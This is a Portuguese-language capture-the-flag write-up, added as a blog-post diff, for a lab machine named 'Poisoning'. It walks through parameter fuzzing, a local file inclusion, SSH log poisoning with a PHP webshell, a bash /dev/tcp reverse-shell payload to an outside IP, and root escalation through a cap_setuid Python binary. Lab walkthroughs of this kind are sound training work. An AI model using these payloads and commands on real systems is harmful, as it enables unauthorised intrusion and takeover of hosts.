@@ -1,0 +1,105 @@
+---
+title: 'Poisoning Writeup'
+date: '2024-11-08'
+tags: ['LFI', 'RCE', 'Linux']
+draft: false
+summary: 'A Máquina Poisoning possui vulnerabilidade LFI explorado com Log Poisoning para execução de RCE, seguido por privilege escalation usando Python com capacidade cap_setuid+ep para root.'
+images: ['/static/images/poisoning-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/poisoning-writeup-images/default.png)
+
+### **Port Scanning**
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```bash
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 44:78:eb:00:c1:c8:a7:25:1c:57:61:68:2b:1b:37:37 (RSA)
+|   256 1d:6f:e8:50:cb:74:10:cc:62:60:43:76:38:67:e3:be (ECDSA)
+|_  256 99:8a:b1:8b:f3:c3:47:a0:14:20:33:d7:0b:71:92:8d (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Crowsec
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-generator: Nicepage 3.25.3, nicepage.com
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Somente as portas 22 (SSH) e 80 (HTTP) estão abertas
+
+---
+
+### **Enumeration**
+
+## http://172.16.7.186
+
+![poisoning](/static/images/poisoning-writeup-images/image.png)
+
+O site em sí não tem muita funcionalidade; no entanto, foi possível achar um arquivo php que podemos utilizar pra ganhar um LFI.
+
+![poisoning 2](/static/images/poisoning-writeup-images/image1.png)
+
+Utilizei o ffuf pra realizar um fuzzing no parametro:
+
+`ffuf -u http://172.16.7.186/\\?FUZZ\\=/etc/passwd -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt -fw 5559`
+
+![poisoning 2](/static/images/poisoning-writeup-images/image2.png)
+
+Parâmetro page encontrado!
+
+`http://172.16.7.186/?page=/etc/passwd`
+
+![poisoning 3](/static/images/poisoning-writeup-images/image3.png)
+
+Como a porta 22 (SSH) está aberta, escalei o LFI pra um RCE, envenenando o log do ssh.
+
+primeiro, me conectei ao ssh com o netcat:
+
+`nc -nv $IP 22`
+
+Em seguida, basta mandar a `webshell` em php dentro do ssh.
+
+`h4x0rh4x/<?php passthru($_GET['cmd']); ?>`
+
+![poisoning 4](/static/images/poisoning-writeup-images/image4.png)
+
+Para verificar se deu certo, teremos que usar o LFI pra acessar o diretório `var/log/auth.log`
+
+`172.16.7.186/?page=/var/log/auth.log`
+
+![poisoning 5](/static/images/poisoning-writeup-images/image5.png)
+
+Com isso temos o nosso RCE.
+
+---
+
+## Foot Hold
+
+`http://172.16.7.186/?page=/var/log/auth.log&cmd=bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'`
+
+OBS: Lembre-se de encodar a payload.
+
+![poisoning 6](/static/images/poisoning-writeup-images/image6.png)
+
+---
+
+## Privillege Escalation
+
+`getcap -r / 2>/dev/null`
+
+![poisoning 7](/static/images/poisoning-writeup-images/image7.png)
+
+`/usr/bin/python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
+
+![poisoning 8](/static/images/poisoning-writeup-images/image8.png)
+
+---
+
+## Proof
+
+![poisoning 9](/static/images/poisoning-writeup-images/image9.png)
